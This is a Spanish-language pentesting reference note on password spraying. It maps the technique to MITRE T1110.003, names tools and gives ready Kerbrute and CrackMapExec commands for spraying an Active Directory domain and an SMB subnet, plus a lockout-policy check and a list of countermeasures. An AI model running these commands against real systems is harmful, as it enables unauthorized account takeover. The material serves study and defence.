# Password Spraying

## Descripción
Técnica de ataque de fuerza bruta que consiste en probar una sola contraseña común (ej: Verano2024!) contra una lista masiva de usuarios. A diferencia de la fuerza bruta tradicional, el password spraying busca evadir las políticas de bloqueo de cuentas al realizar pocos intentos por cada usuario en un intervalo de tiempo.

## Clasificación
- **Fase**: Explotación
- **MITRE ATT&CK**: T1110.003 (Brute Force: Password Spraying)
- **Plataforma**: Multi
- **Dificultad**: Básica

## Herramientas
- **CrackMapExec** / **NetExec** (`--pass-pol`, `--continue-on-success`) — para automatizar el spraying contra protocolos como SMB, WINRM o MSSQL.
- **Kerbrute** (`passwordspray`) — herramienta extremadamente rápida para spraying mediante el protocolo Kerberos.
- **Burp Suite** (Intruder - Pitchfork) — para ataques de spraying en formularios de login web.

## Comandos / Ejemplos

### Ataque contra Directorio Activo con Kerbrute
```bash
# Probar una contraseña contra una lista de usuarios vía Kerberos
./kerbrute passwordspray -d internal.corp --dc 192.168.1.10 users.txt "Password123!"
# Resultado: lista los usuarios que poseen esa contraseña sin bloquear cuentas
```

### Uso de CrackMapExec (SMB)
```bash
# Ejecutar spraying y verificar privilegios de administrador
crackmapexec smb 192.168.1.0/24 -u users.txt -p "Password123!" --continue-on-success
# Resultado: marca con Pwn3d! si el usuario tiene acceso administrativo
```

### Verificar política de bloqueo antes de empezar
```bash
# Consultar política de contraseñas para evitar bloqueos masivos
crackmapexec smb 192.168.1.10 -u 'guest' -p '' --pass-pol
```

## Contramedidas
- Implementar Multi-Factor Authentication (MFA) de forma obligatoria.
- Configurar políticas de bloqueo de cuentas progresivas y alertar sobre picos de intentos fallidos.
- Educar a los usuarios para evitar el uso de contraseñas predecibles basadas en estaciones del año o nombre de la empresa.
- Utilizar soluciones de protección de identidad (ej: Azure AD Password Protection) para prohibir contraseñas comunes.

## Referencias
- Kim, P. (2018). *The Hacker Playbook 3*. Secure Planet, LLC.
- MITRE Corporation. (2024). ATT&CK Technique T1110.003: Brute Force: Password Spraying. https://attack.mitre.org/techniques/T1110/003/
- Notas del proyecto: notas-md/HNotes/HNotes/Recon/Passwords.md
